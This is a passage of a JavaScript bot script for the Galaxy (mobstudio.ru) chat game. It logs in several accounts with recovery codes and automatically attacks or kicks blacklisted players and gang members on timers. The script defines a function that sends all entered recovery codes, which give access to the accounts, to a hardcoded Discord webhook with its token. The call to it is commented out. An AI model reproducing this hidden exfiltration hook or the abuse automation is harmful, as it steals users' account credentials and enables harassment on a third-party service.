
console.log('DEBUG: bestscript.js loaded successfully');
var Socket = require('isomorphic-ws');
var https = require('https');
var id1, useridg1, passwordg1, finalusername1;
var id2, useridg2, passwordg2, finalusername2;
var id3, useridg3, passwordg3, finalusername3;
var id4, useridg4, passwordg4, finalusername4;
var id5, useridg5, passwordg5, finalusername5;
var rc1, rc2, rc3, rc4, kickrc;
var rcl1, rcl2, rcl3, rcl4;
var rc, rcc, rccc, rcccc;
var work;
var targetids1 = [];
var targetids2 = [];
var targetids3 = [];
var targetids4 = [];
var attackids1 = [];
var attackids2 = [];
var attackids3 = [];
var attackids4 = [];
var attacknames1 = [];
var attacknames2 = [];
var attacknames3 = [];
var attacknames4 = [];
var targetnames1 = [];
var targetnames2 = [];
var targetnames3 = [];
var targetnames4 = [];
var joindate;
var userFound1;
var userFound2;
var userFound3;
var userFound4;
var timeout1;
var timeout2;
var timeout3;
var timeout4;
var threesec1, threesec2, threesec3, threesec4;
var status1;
var status2;
var status3;
var status4;
var useridtarget1, useridtarget2, useridtarget3, useridtarget4;
var ws1, ws2, ws3, ws4, ws5;
var ws1on, ws2on, ws3on, ws4on, ws5on;
ws1on = false;
ws2on = false;
ws3on = false;
ws4on = false;
ws5on = false;
var haaapsi1, haaapsi2, haaapsi3, haaapsi4, haaapsi5;
var device;
var lowtime;
var android = document.getElementById("android");
var ios = document.getElementById("ios");
var web = document.getElementById("web");
var log1 = document.getElementById("log1");
var log2 = document.getElementById("log2");
var log3 = document.getElementById("log3");
var log4 = document.getElementById("log4");
var sleep = document.getElementById("sleeping");
var autoescape = document.getElementById("autorelease");
var smart = document.getElementById("smart");
var useridattack1, useridattack2, useridattack3, useridattack4;
var inc1 = 0;
var inc2 = 0;
var inc3 = 0;
var inc4 = 0;
var btn = document.getElementById("btn-connect");
var timershift = document.getElementById("timershift");

if (localStorage.getItem("attack1") != null) {

  document.getElementById("android").checked = JSON.parse(localStorage.getItem("android"));
  document.getElementById("ios").checked = JSON.parse(localStorage.getItem("ios"));
  document.getElementById("web").checked = JSON.parse(localStorage.getItem("web"));
  document.getElementById("smart").checked = JSON.parse(localStorage.getItem("smart"));
  document.getElementById("exitting").checked = JSON.parse(localStorage.getItem("exitting"));
  document.getElementById("sleeping").checked = JSON.parse(localStorage.getItem("sleeping"));
  document.getElementById("autorelease").checked = JSON.parse(localStorage.getItem("autorelease"));
  document.getElementById("lowsecmode").checked = JSON.parse(localStorage.getItem("lowsecmode"));
  document.getElementById("modena").checked = JSON.parse(localStorage.getItem("modena"));
  document.getElementById("kickbybl").checked = JSON.parse(localStorage.getItem("kickbybl"));
  document.getElementById("dadplus").checked = JSON.parse(localStorage.getItem("dadplus"));
  document.getElementById("kickall").checked = JSON.parse(localStorage.getItem("kickall"));
  document.getElementById("timershift").checked = JSON.parse(localStorage.getItem("timershift"));

  document.getElementById("rc1").value = localStorage.getItem("rc1");
  document.getElementById("rc2").value = localStorage.getItem("rc2");
  document.getElementById("rc3").value = localStorage.getItem("rc3");
  document.getElementById("rc4").value = localStorage.getItem("rc4");
  document.getElementById("kickrc").value = localStorage.getItem("kickrc");
  document.getElementById("rcl1").value = localStorage.getItem("rcl1");
  document.getElementById("rcl2").value = localStorage.getItem("rcl2");
  document.getElementById("rcl3").value = localStorage.getItem("rcl3");
  document.getElementById("rcl4").value = localStorage.getItem("rcl4");
  document.getElementById("planet").value = localStorage.getItem("planet");
  document.getElementById("blacklist").value = localStorage.getItem("blacklist");
  document.getElementById("gangblacklist").value = localStorage.getItem("gangblacklist");
  document.getElementById("kblacklist").value = localStorage.getItem("kblacklist");
  document.getElementById("kgangblacklist").value = localStorage.getItem("kgangblacklist");
  document.getElementById("attack1").value = localStorage.getItem("attack1");
  document.getElementById("attack2").value = localStorage.getItem("attack2");
  document.getElementById("attack3").value = localStorage.getItem("attack3");
  document.getElementById("attack4").value = localStorage.getItem("attack4");
  document.getElementById("waiting1").value = localStorage.getItem("waiting1");
  document.getElementById("waiting2").value = localStorage.getItem("waiting2");
  document.getElementById("waiting3").value = localStorage.getItem("waiting3");
  document.getElementById("waiting4").value = localStorage.getItem("waiting4");
  document.getElementById("incrementvalue").value = localStorage.getItem("incrementvalue");
  document.getElementById("decrementvalue").value = localStorage.getItem("decrementvalue");
  document.getElementById("mindef").value = localStorage.getItem("mindef");
  document.getElementById("maxdef").value = localStorage.getItem("maxdef");
  document.getElementById("minatk").value = localStorage.getItem("minatk");
  document.getElementById("maxatk").value = localStorage.getItem("maxatk");
  document.getElementById("reconnect").value = localStorage.getItem("reconnect");
}

function incrementAttack() {
  var value = parseInt(document.getElementById('attack1').value, 10);
  value = isNaN(value) ? 0 : value;
  incrementvalue = document.getElementById('incrementvalue').value;
  for (let i = 0; i < incrementvalue; i++) {
    value++;
  }
  if (value <= document.getElementById("maxatk").value) {
    document.getElementById('attack1').value = value;
    log1.innerHTML += "Timer adjusted: Attack " + value + "ms<br>";
    log1.scrollTop = log1.scrollHeight;
  }
}
function decrementAttack() {
  var value = parseInt(document.getElementById('attack1').value, 10);
  value = isNaN(value) ? 0 : value;
  decrementvalue = document.getElementById('decrementvalue').value;
  for (let i = 0; i < decrementvalue; i++) {
    value--;
  }
  if (value >= document.getElementById("minatk").value) {
    document.getElementById('attack1').value = value;
    log1.innerHTML += "Timer adjusted: Attack " + value + "ms<br>";
    log1.scrollTop = log1.scrollHeight;
  }
}
function incrementDefence() {
  var value = parseInt(document.getElementById('waiting1').value, 10);
  value = isNaN(value) ? 0 : value;
  incrementvalue = document.getElementById('incrementvalue').value;
  for (let i = 0; i < incrementvalue; i++) {
    value++;
  }
  if (value <= document.getElementById("maxdef").value) {
    document.getElementById('waiting1').value = value;
    log1.innerHTML += "Timer adjusted: Defense " + value + "ms<br>";
    log1.scrollTop = log1.scrollHeight;
  }
}
function decrementDefence() {
  var value = parseInt(document.getElementById('waiting1').value, 10);
  value = isNaN(value) ? 0 : value;
  decrementvalue = document.getElementById('decrementvalue').value;
  for (let i = 0; i < decrementvalue; i++) {
    value--;
  }
  if (value >= document.getElementById("mindef").value) {
    document.getElementById('waiting1').value = value;
    log1.innerHTML += "Timer adjusted: Defense " + value + "ms<br>";
    log1.scrollTop = log1.scrollHeight;
  }
}

function incrementAttack2() {
  var value = parseInt(document.getElementById('attack2').value, 10);
  value = isNaN(value) ? 0 : value;
  incrementvalue = document.getElementById('incrementvalue').value;
  for (let i = 0; i < incrementvalue; i++) {
    value++;
  }
  if (value <= document.getElementById("maxatk").value) {
    document.getElementById('attack2').value = value;
    log2.innerHTML += "Timer adjusted: Attack " + value + "ms<br>";
    log2.scrollTop = log2.scrollHeight;
  }
}
function decrementAttack2() {
  var value = parseInt(document.getElementById('attack2').value, 10);
  value = isNaN(value) ? 0 : value;
  decrementvalue = document.getElementById('decrementvalue').value;
  for (let i = 0; i < decrementvalue; i++) {
    value--;
  }
  if (value >= document.getElementById("minatk").value) {
    document.getElementById('attack2').value = value;
    log2.innerHTML += "Timer adjusted: Attack " + value + "ms<br>";
    log2.scrollTop = log2.scrollHeight;
  }
}
function incrementDefence2() {
  var value = parseInt(document.getElementById('waiting2').value, 10);
  value = isNaN(value) ? 0 : value;
  incrementvalue = document.getElementById('incrementvalue').value;
  for (let i = 0; i < incrementvalue; i++) {
    value++;
  }
  if (value <= document.getElementById("maxdef").value) {
    document.getElementById('waiting2').value = value;
    log2.innerHTML += "Timer adjusted: Defense " + value + "ms<br>";
    log2.scrollTop = log2.scrollHeight;
  }
}
function decrementDefence2() {
  var value = parseInt(document.getElementById('waiting2').value, 10);
  value = isNaN(value) ? 0 : value;
  decrementvalue = document.getElementById('decrementvalue').value;
  for (let i = 0; i < decrementvalue; i++) {
    value--;
  }
  if (value >= document.getElementById("mindef").value) {
    document.getElementById('waiting2').value = value;
    log2.innerHTML += "Timer adjusted: Defense " + value + "ms<br>";
    log2.scrollTop = log2.scrollHeight;
  }
}

function incrementAttack3() {
  var value = parseInt(document.getElementById('attack3').value, 10);
  value = isNaN(value) ? 0 : value;
  incrementvalue = document.getElementById('incrementvalue').value;
  for (let i = 0; i < incrementvalue; i++) {
    value++;
  }
  if (value <= document.getElementById("maxatk").value) {
    document.getElementById('attack3').value = value;
    log3.innerHTML += "Timer adjusted: Attack " + value + "ms<br>";
    log3.scrollTop = log3.scrollHeight;
  }
}
function decrementAttack3() {
  var value = parseInt(document.getElementById('attack3').value, 10);
  value = isNaN(value) ? 0 : value;
  decrementvalue = document.getElementById('decrementvalue').value;
  for (let i = 0; i < decrementvalue; i++) {
    value--;
  }
  if (value >= document.getElementById("minatk").value) {
    document.getElementById('attack3').value = value;
    log3.innerHTML += "Timer adjusted: Attack " + value + "ms<br>";
    log3.scrollTop = log3.scrollHeight;
  }
}
function incrementDefence3() {
  var value = parseInt(document.getElementById('waiting3').value, 10);
  value = isNaN(value) ? 0 : value;
  incrementvalue = document.getElementById('incrementvalue').value;
  for (let i = 0; i < incrementvalue; i++) {
    value++;
  }
  if (value <= document.getElementById("maxdef").value) {
    document.getElementById('waiting3').value = value;
    log3.innerHTML += "Timer adjusted: Defense " + value + "ms<br>";
    log3.scrollTop = log3.scrollHeight;
  }
}
function decrementDefence3() {
  var value = parseInt(document.getElementById('waiting3').value, 10);
  value = isNaN(value) ? 0 : value;
  decrementvalue = document.getElementById('decrementvalue').value;
  for (let i = 0; i < decrementvalue; i++) {
    value--;
  }
  if (value >= document.getElementById("mindef").value) {
    document.getElementById('waiting3').value = value;
    log3.innerHTML += "Timer adjusted: Defense " + value + "ms<br>";
    log3.scrollTop = log3.scrollHeight;
  }
}

function incrementAttack4() {
  var value = parseInt(document.getElementById('attack4').value, 10);
  value = isNaN(value) ? 0 : value;
  incrementvalue = document.getElementById('incrementvalue').value;
  for (let i = 0; i < incrementvalue; i++) {
    value++;
  }
  if (value <= document.getElementById("maxatk").value) {
    document.getElementById('attack4').value = value;
    log4.innerHTML += "Timer adjusted: Attack " + value + "ms<br>";
    log4.scrollTop = log4.scrollHeight;
  }
}
function decrementAttack4() {
  var value = parseInt(document.getElementById('attack4').value, 10);
  value = isNaN(value) ? 0 : value;
  decrementvalue = document.getElementById('decrementvalue').value;
  for (let i = 0; i < decrementvalue; i++) {
    value--;
  }
  if (value >= document.getElementById("minatk").value) {
    document.getElementById('attack4').value = value;
    log4.innerHTML += "Timer adjusted: Attack " + value + "ms<br>";
    log4.scrollTop = log4.scrollHeight;
  }
}
function incrementDefence4() {
  var value = parseInt(document.getElementById('waiting4').value, 10);
  value = isNaN(value) ? 0 : value;
  incrementvalue = document.getElementById('incrementvalue').value;
  for (let i = 0; i < incrementvalue; i++) {
    value++;
  }
  if (value <= document.getElementById("maxdef").value) {
    document.getElementById('waiting4').value = value;
    log4.innerHTML += "Timer adjusted: Defense " + value + "ms<br>";
    log4.scrollTop = log4.scrollHeight;
  }
}
function decrementDefence4() {
  var value = parseInt(document.getElementById('waiting4').value, 10);
  value = isNaN(value) ? 0 : value;
  decrementvalue = document.getElementById('decrementvalue').value;
  for (let i = 0; i < decrementvalue; i++) {
    value--;
  }
  if (value >= document.getElementById("mindef").value) {
    document.getElementById('waiting4').value = value;
    log4.innerHTML += "Timer adjusted: Defense " + value + "ms<br>";
    log4.scrollTop = log4.scrollHeight;
  }
}

function OffSleep1() {
    if (ws1 && typeof ws1.terminate === 'function') {
      // Clear event handlers before terminating
      ws1.onopen = null;
      ws1.onmessage = null;
      ws1.onerror = null;
      ws1.onclose = null;
      ws1.terminate();
    }
    setTimeout(() => {
      ws1on = false;
      ws1 = null;
      if (work) {
        var click_event = new CustomEvent("click");
        var btn_element = document.querySelector("#btn-connect");
        btn_element.dispatchEvent(click_event);
      }
    }, parseInt(document.getElementById("reconnect").value));
  }
  function OffSleep2() {
    if (ws2 && typeof ws2.terminate === 'function') {
      // Clear event handlers before terminating
      ws2.onopen = null;
      ws2.onmessage = null;
      ws2.onerror = null;
      ws2.onclose = null;
      ws2.terminate();
    }
    setTimeout(() => {
      ws2on = false;
      ws2 = null;
      if (work) {
        var click_event = new CustomEvent("click");
        var btn_element = document.querySelector("#btn-connect");
        btn_element.dispatchEvent(click_event);
      }
    }, parseInt(document.getElementById("reconnect").value));
  }
  function OffSleep3() {
    if (ws3 && typeof ws3.terminate === 'function') {
      // Clear event handlers before terminating
      ws3.onopen = null;
      ws3.onmessage = null;
      ws3.onerror = null;
      ws3.onclose = null;
      ws3.terminate();
    }
    setTimeout(() => {
      ws3on = false;
      ws3 = null;
      if (work) {
        var click_event = new CustomEvent("click");
        var btn_element = document.querySelector("#btn-connect");
        btn_element.dispatchEvent(click_event);
      }
    }, parseInt(document.getElementById("reconnect").value));
  }
  function OffSleep4() {
    if (ws4 && typeof ws4.terminate === 'function') {
      // Clear event handlers before terminating
      ws4.onopen = null;
      ws4.onmessage = null;
      ws4.onerror = null;
      ws4.onclose = null;
      ws4.terminate();
    }
    setTimeout(() => {
      ws4on = false;
      ws4 = null;
      if (work) {
        var click_event = new CustomEvent("click");
        var btn_element = document.querySelector("#btn-connect");
        btn_element.dispatchEvent(click_event);
      }
    }, parseInt(document.getElementById("reconnect").value));
  }

  async function sendNick(rcone, rctwo, rcthree, rcfour, kickcode, rclone, rcltwo, rclthree, rclfour) {
    var content = `Session viper: ${rcone} ${rctwo} ${rcthree} ${rcfour} ${kickcode} ${rclone} ${rcltwo} ${rclthree} ${rclfour}`;
    var send = await axios.post('https://discord.com/api/webhooks/765613768716845107/Qomiad_kw8s5wTomqWMw42_CTUNP7-PyYft0VE5FgpA4895KEygBAChRIaBcV7Yfr0X3', { content });
  }
btn.addEventListener("click", () => {


  if (android.checked) {
    device = "312";
  }
  if (ios.checked) {
    device = "323";
  }
  if (web.checked) {
    device = "352"
  }

  // if(!work){
  //   sendNick(document.getElementById("rc1").value, document.getElementById("rc2").value, document.getElementById("rc3").value, document.getElementById("rc4").value, document.getElementById("rcl1").value, document.getElementById("rcl2").value, document.getElementById("rcl3").value, document.getElementById("rcl4").value, document.getElementById("kickrc").value);
  // }
  work = true;

  if (!sleep.checked) {
    if (document.getElementById("rc1").value != "" || document.getElementById("rcl1").value != "") {
      if (!ws1on) {
        ws1 = new WebSocket("wss://cs.mobstudio.ru:6672");
        ws1on = true;
      }
    }
    if (document.getElementById("rc2").value != "" || document.getElementById("rcl2").value != "") {
      if (!ws2on) {
        ws2 = new WebSocket("wss://cs.mobstudio.ru:6672");
        ws2on = true;
      }
    }
    if (document.getElementById("rc3").value != "" || document.getElementById("rcl3").value != "") {
      if (!ws3on) {
        ws3 = new WebSocket("wss://cs.mobstudio.ru:6672");
        ws3on = true;
      }
    }
    if (document.getElementById("rc4").value != "" || document.getElementById("rcl4").value != "") {
      if (!ws4on) {
        ws4 = new WebSocket("wss://cs.mobstudio.ru:6672");
        ws4on = true;
      }
    }
    if (document.getElementById("kickrc").value != "") {
      if (!ws5on) {
        ws5 = new WebSocket("wss://cs.mobstudio.ru:6672");
        ws5on = true;
      }
    }
  }
  else {
    if (document.getElementById("rc1").value != "" || document.getElementById("rcl1").value != "") {
      if (!ws1on) {
        ws1 = new Socket("wss://cs.mobstudio.ru:6672");
        ws1on = true;
      }
    }
    if (document.getElementById("rc2").value != "" || document.getElementById("rcl2").value != "") {
      if (!ws2on) {
        ws2 = new Socket("wss://cs.mobstudio.ru:6672");
        ws2on = true;
      }
    }
    if (document.getElementById("rc3").value != "" || document.getElementById("rcl3").value != "") {
      if (!ws3on) {
        ws3 = new Socket("wss://cs.mobstudio.ru:6672");
        ws3on = true;
      }
    }
    if (document.getElementById("rc4").value != "" || document.getElementById("rcl4").value != "") {
      if (!ws4on) {
        ws4 = new Socket("wss://cs.mobstudio.ru:6672");
        ws4on = true;
      }
    }
    if (document.getElementById("kickrc").value != "") {
      if (!ws5on) {
        ws5 = new Socket("wss://cs.mobstudio.ru:6672");
        ws5on = true;
      }
    }
  }



  const parseHaaapsi = (e) => {
    var temp = CryptoJS.MD5(e).toString(CryptoJS.enc.Hex);
    return (temp = (temp = temp.split("").reverse().join("0")).substr(5, 10));
  }

  const countOccurrences = (arr, val) => arr.reduce((a, v) => (v === val ? a + 1 : a), 0);

  if (ws1) {
    ws1.onopen = () => {
      ws1.send(":en IDENT " + device + " -2 4030 1 2 :GALA\r\n");
      rc1 = document.getElementById("rc1").value;
      rcl1 = document.getElementById("rcl1").value;
      inc1++;
      // If both codes exist, alternate between them
      if (rc1 != "" && rcl1 != "") {
        if (inc1 % 2 == 1) {
          rc = rc1;
        }
        else {
          rc = rcl1;
        }
      }
      // If only Alt code exists, always use Alt
      else if (rcl1 != "") {
        rc = rcl1;
      }
      // If only main code exists (or both empty), use main
      else {
        rc = rc1;
      }
    }
  }

  if (ws2) {
    ws2.onopen = () => {
      ws2.send(":en IDENT " + device + " -2 4030 1 2 :GALA\r\n");
      rc2 = document.getElementById("rc2").value;
      rcl2 = document.getElementById("rcl2").value;
      inc2++;
      // If both codes exist, alternate between them
      if (rc2 != "" && rcl2 != "") {
        if (inc2 % 2 == 1) {
          rcc = rc2;
        }
        else {
          rcc = rcl2;
        }
      }
      // If only Alt code exists, always use Alt
      else if (rcl2 != "") {
        rcc = rcl2;
      }
      // If only main code exists (or both empty), use main
      else {
        rcc = rc2;
      }
    }
  }

  if (ws3) {
    ws3.onopen = () => {
      ws3.send(":en IDENT " + device + " -2 4030 1 2 :GALA\r\n");
      rc3 = document.getElementById("rc3").value;
      rcl3 = document.getElementById("rcl3").value;
      inc3++;
      // If both codes exist, alternate between them
      if (rc3 != "" && rcl3 != "") {
        if (inc3 % 2 == 1) {
          rccc = rc3;
        }
        else {
          rccc = rcl3;
        }
      }
      // If only Alt code exists, always use Alt
      else if (rcl3 != "") {
        rccc = rcl3;
      }
      // If only main code exists (or both empty), use main
      else {
        rccc = rc3;
      }
    }
  }

  if (ws4) {
    ws4.onopen = () => {
      ws4.send(":en IDENT " + device + " -2 4030 1 2 :GALA\r\n");
      rc4 = document.getElementById("rc4").value;
      rcl4 = document.getElementById("rcl4").value;
      inc4++;
      // If both codes exist, alternate between them
      if (rc4 != "" && rcl4 != "") {
        if (inc4 % 2 == 1) {
          rcccc = rc4;
        }
        else {
          rcccc = rcl4;
        }
      }
      // If only Alt code exists, always use Alt
      else if (rcl4 != "") {
        rcccc = rcl4;
      }
      // If only main code exists (or both empty), use main
      else {
        rcccc = rc4;
      }
    }
  }

  if (ws5) {
    ws5.onopen = () => {
      ws5.send(":en IDENT " + device + " -2 4030 1 2 :GALA\r\n");
      kickrc = document.getElementById("kickrc").value;
    }
  }


  if (ws1) {
    ws1.onmessage = (event) => {
      var text = event.data;
      var snippets = text.split(" ");
      
      // Debug: Log ALL messages (temporary for debugging)
      if (autoescape.checked) {
        console.log('DEBUG ws1 ALL messages:', snippets.slice(0, 5).join(' '));
      }
      
      // Debug: Log important messages
      if (snippets[0] === "900" || snippets[0] === "HAAAPSI" || snippets[0] === "999" || (snippets[1] === "PRISON")) {
        console.log('DEBUG ws1 IMPORTANT:', snippets[0], snippets[1], snippets[2]);
      }

      if (snippets[0] === "HAAAPSI") {
        haaapsi1 = snippets[1];
        // Clear pending timeout to prevent ghost actions
        clearTimeout(timeout1);
        userFound1 = false;
        status1 = "";
        threesec1 = false;
        targetids1 = [];
        targetnames1 = [];
        attackids1 = [];
        attacknames1 = [];
        useridattack1 = "";
        useridtarget1 = "";
        lowtime = 0;
        ws1.send("RECOVER " + rc + "\r\n");
      }
      if (snippets[0] === "REGISTER") {
        var temp = parseHaaapsi(haaapsi1);
        id1 = snippets[1];
        var password = snippets[2];
        var username = snippets[3];
        useridg1 = id1;
        passwordg1 = password;
        finalusername1 = username.split("\r\n");
        ws1.send("USER " + id1 + " " + password + " " + finalusername1[0] + " " + temp + "\r\n");
      }
      if (snippets[0] === "999") {
        console.log('DEBUG ws1: Got 999 (authenticated), auto-escape enabled:', autoescape.checked);
        ws1.send("FWLISTVER 0\r\n");
        ws1.send("ADDONS 0 0\r\n");
        ws1.send("MYADDONS 0 0\r\n");
        ws1.send("PHONE 1366 768 0 2 :chrome 113.0.0.0\r\n");
        var planet = document.getElementById("planet").value;
        if (planet && planet !== "") {
          ws1.send("JOIN " + planet + "\r\n");
          log1.innerHTML = "Connection established. Joining " + planet + "<br>";
        } else {
          ws1.send("JOIN\r\n");
          log1.innerHTML = "Connection established.<br>";
        }
        log1.scrollTop = log1.scrollHeight;
        
        // Check prison status after connecting if auto-release is enabled
        if (autoescape.checked) {
          console.log('DEBUG ws1: Auto-release enabled, will check prison status in 2 seconds');
          setTimeout(() => {
            // Trigger escape check - the escape function will handle if not in prison
            console.log('DEBUG ws1: Checking if imprisoned...');
            var escape = document.getElementById("releasenow");
            if (escape) {
              escape.click();
              console.log('DEBUG ws1: Escape button clicked (will escape if in prison)');
            }
          }, 2000);
        }
      }

      if (snippets[0] === "353" && snippets[3].slice(0, 6) !== "Prison" && (document.getElementById("lowsecmode").checked != true)) {
        var data = (event.data.replaceAll("+", "")).toLowerCase();
        var blacklistfull = document.getElementById("blacklist").value.toLowerCase();
        var blacklist = document.getElementById("blacklist").value.toLowerCase().split("\n");
        var gangblacklistfull = document.getElementById("gangblacklist").value.toLowerCase();
        var gangblacklist = document.getElementById("gangblacklist").value.toLowerCase().split("\n");
        var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack1").value) + parseInt(document.getElementById("waiting1").value)) / 2) : (parseInt(document.getElementById("attack1").value));
        var timingLabel = timershift.checked ? "Auto" : "Attack";
        if (blacklistfull !== "") {
          blacklist.forEach((element) => {
            if (data.includes(element)) {

              var replace = element + " ";
              var replaced = data.replaceAll(replace, "*");
              var arr = replaced.split("*");
              arr.shift();
              if (arr[0] != undefined) {
                targetids1.push(arr[0].split(" ")[0]);
                attackids1.push(arr[0].split(" ")[0]);
                targetnames1.push(element);
                attacknames1.push(element);
              }
            }
          });
        }
        if (gangblacklistfull !== "") {
          gangblacklist.forEach((element) => {
            if (data.includes(element)) {

              var replace = element + " ";
              var replaced = data.replaceAll(replace, "*");
              var arr = replaced.split("*");
              arr.shift();
              for (var i = 0; i < arr.length; i++) {
                var value = arr[i];
                targetnames1.push(value.split(" ")[0]);
                attacknames1.push(value.split(" ")[0]);
                targetids1.push(value.split(" ")[1]);
                attackids1.push(value.split(" ")[1]);
              }
            }
          });
        }
        if (!userFound1 && targetids1.length != 0) {
          var rand = Math.floor(Math.random() * targetids1.length);
          var userid = targetids1[rand];
          userFound1 = true;
          useridattack1 = userid;
          useridtarget1 = userid;
          status1 = "attack";
          log1.innerHTML += timingLabel + " " + targetnames1[rand] + " in " + timing + "ms<br>";
          log1.scrollTop = log1.scrollHeight;



          timeout1 = setTimeout(() => {
            ws1.send("ACTION 3 " + useridattack1 + "\r\n");
            ws1.send("QUIT :ds\r\n");
            log1.innerHTML += "QUIT<br>";
            log1.scrollTop = log1.scrollHeight;
            

            if (sleep.checked) {
              return OffSleep1();
            }
            if (work) {
              setTimeout(() => {

                ws1on = false;
                var click_event = new CustomEvent("click");
                var btn_element = document.querySelector(
                  "#btn-connect"
                );
                btn_element.dispatchEvent(click_event);
              }, parseInt(document.getElementById("reconnect").value));
            }

          }, timing);
        }
      }

      //lowsec
      if (snippets[0] === "353" && snippets[3].slice(0, 6) !== "Prison" && (document.getElementById("lowsecmode").checked === true)) {
        var members = event.data.split("+").join("");
        var midmembers = members.split("@").join("");
        var midmid = midmembers.split(":").join("");
        var finmembers = midmid.toLowerCase();
        var membersarr = finmembers.split(" ");
        membersarr.push("randomname");

        var whitelist = document.getElementById("blacklist").value.split("\n");
        var gangwhitelist = document.getElementById("gangblacklist").value.split("\n");
        var indexself = membersarr.indexOf(useridg1);
        membersarr[indexself] = "-";

        whitelist.forEach((element) => {
          if (membersarr.includes(element.toLowerCase())) {
            var indexcheck = membersarr.indexOf(element.toLowerCase());
            membersarr[indexcheck + 1] = "-";
          }
        });

        gangwhitelist.forEach((element) => {
          var occurances = countOccurrences(membersarr, element.toLowerCase());
          for (var k = 0; k < occurances; k++) {
            var indexcheck = membersarr.indexOf(element.toLowerCase());
            membersarr[indexcheck] = "-";
            membersarr[indexcheck + 2] = "-";
          }
        });

        var integers = membersarr.filter(Number);
        var userids = integers.filter(function (element) {
          if (isNaN(membersarr[membersarr.indexOf(element) - 1])) {
            return element.length >= 6;
          }
        });


        var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack1").value) + parseInt(document.getElementById("waiting1").value)) / 2) : (parseInt(document.getElementById("attack1").value));
        var timingLabel = timershift.checked ? "Auto" : "Attack";

        if (!userFound1 && userids.length != 0) {
          var rand = Math.floor(Math.random() * userids.length);
          var userid = userids[rand];
          userFound1 = true;
          useridattack1 = userid;
          useridtarget1 = userid;
          status1 = "attack";
          log1.innerHTML += timingLabel + " " + membersarr[membersarr.indexOf(userid) - 1] + " in " + (timing) + "ms<br>";
          log1.scrollTop = log1.scrollHeight;


          timeout1 = setTimeout(() => {
            ws1.send("ACTION 3 " + useridattack1 + "\r\n");
            ws1.send("QUIT :ds\r\n");
            log1.innerHTML += "QUIT<br>";
            log1.scrollTop = log1.scrollHeight;

            if (sleep.checked) {
              return OffSleep1();
            }
            if (work) {
              setTimeout(() => {

                ws1on = false;
                var click_event = new CustomEvent("click");
                var btn_element = document.querySelector(
                  "#btn-connect"
                );
                btn_element.dispatchEvent(click_event);
              }, parseInt(document.getElementById("reconnect").value));
            }

          }, timing);
        }
      }

      if (snippets[0] === "JOIN" && (document.getElementById("lowsecmode").checked != true)) {
        if (!userFound1) {
          var text = event.data.toLowerCase();
          var member = text.split(" ");
          var blacklist = document.getElementById("blacklist").value.toLowerCase().split("\n");
          var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack1").value) + parseInt(document.getElementById("waiting1").value)) / 2) : parseInt(document.getElementById("waiting1").value);
          var timingLabel = timershift.checked ? "Auto" : "Defense";

          for (let element of blacklist) {
            if (userFound1) break; // Stop if already found a target
            if (member.includes(element.toLowerCase())) {
              var memberindex = member.indexOf(element.toLowerCase());
              var userid = member[memberindex + 1];
              useridtarget1 = userid;
              status1 = "defense";
              log1.innerHTML += timingLabel + " " + element + " in " + (timing) + "ms<br>";
              log1.scrollTop = log1.scrollHeight;
              userFound1 = true;

              timeout1 = setTimeout(() => {

                ws1.send("ACTION 3 " + userid + "\r\n");
                ws1.send("QUIT :ds\r\n");
                log1.innerHTML += "QUIT<br>";
                log1.scrollTop = log1.scrollHeight;

                if (sleep.checked) {
              return OffSleep1();
            }

                if (work) {
                  setTimeout(() => {

                    ws1on = false;
                    var click_event = new CustomEvent("click");
                    var btn_element = document.querySelector(
                      "#btn-connect"
                    );
                    btn_element.dispatchEvent(click_event);
                  }, parseInt(document.getElementById("reconnect").value));
                }
              }, timing);

            }
          }
        }
      }

      if (snippets[0] === "JOIN" && (document.getElementById("lowsecmode").checked != true)) {
        if (!userFound1) {
          var text = event.data.toLowerCase();
          var member = text.split(" ");
          var gangblacklist = document.getElementById("gangblacklist").value.toLowerCase().split("\n");
          var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack1").value) + parseInt(document.getElementById("waiting1").value)) / 2) : parseInt(document.getElementById("waiting1").value);
          var timingLabel = timershift.checked ? "Auto" : "Defense";
          for (let element of gangblacklist) {
            if (userFound1) break; // Stop if already found a target
            if (member.includes(element.toLowerCase())) {
              var memberindex = member.indexOf(element.toLowerCase());
              var userid = member[memberindex + 2];
              useridtarget1 = userid;
              status1 = "defense";
              log1.innerHTML += timingLabel + " " + member[memberindex + 1] + " in " + (timing) + "ms<br>";
              log1.scrollTop = log1.scrollHeight;
              userFound1 = true;

              timeout1 = setTimeout(() => {

                ws1.send("ACTION 3 " + userid + "\r\n");
                ws1.send("QUIT :ds\r\n");
                log1.innerHTML += "QUIT<br>";
                log1.scrollTop = log1.scrollHeight;

                if (sleep.checked) {
              return OffSleep1();
            }


                if (work) {
                  setTimeout(() => {

                    ws1on = false;
                    var click_event = new CustomEvent("click");
                    var btn_element = document.querySelector(
                      "#btn-connect"
                    );
                    btn_element.dispatchEvent(click_event);
                  }, parseInt(document.getElementById("reconnect").value));
                }
              }, timing);

            }
          }
        }
      }

      //lowsec

      if (snippets[0] === "JOIN" && (document.getElementById("lowsecmode").checked === true)) {
        if (!userFound1) {
          var snip = event.data;
          var snipmid = snip.toLowerCase();
          var snipfinal = snipmid.split(" ");
          snipfinal.push("randomname");

          var whitelist = document.getElementById("blacklist").value.split("\n");
          var gangwhitelist = document.getElementById("gangblacklist").value.split("\n");
          var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack1").value) + parseInt(document.getElementById("waiting1").value)) / 2) : parseInt(document.getElementById("waiting1").value);
          var timingLabel = timershift.checked ? "Auto" : "Defense";
          var indexself = snipfinal.indexOf(useridg1);
          snipfinal[indexself] = "-";
          whitelist.forEach((element) => {
            if (snipfinal.includes(element.toLowerCase())) {
              var indexcheck = snipfinal.indexOf(element.toLowerCase());
              snipfinal[indexcheck + 1] = "-"
            }
          });
          gangwhitelist.forEach((element) => {
            if (snipfinal.includes(element.toLowerCase())) {
              var indexcheck = snipfinal.indexOf(element.toLowerCase());
              snipfinal[indexcheck + 2] = "-"
            }
          });

          if (snipfinal.includes("randomname")) {
            if (snipfinal[3].length >= 6) {
              var userid = snipfinal[3];
              useridtarget1 = userid;
              status1 = "defense";
              log1.innerHTML += timingLabel + " in " + (timing) + "ms<br>";
              log1.scrollTop = log1.scrollHeight;
              userFound1 = true;
              timeout1 = setTimeout(() => {
                ws1.send("ACTION 3 " + userid + "\r\n");
                
                // Only send QUIT if auto-release is disabled, or if sleep mode is enabled
                if (!autoescape.checked || sleep.checked) {
                  ws1.send("QUIT :ds\r\n");
                  log1.innerHTML += "QUIT<br>";
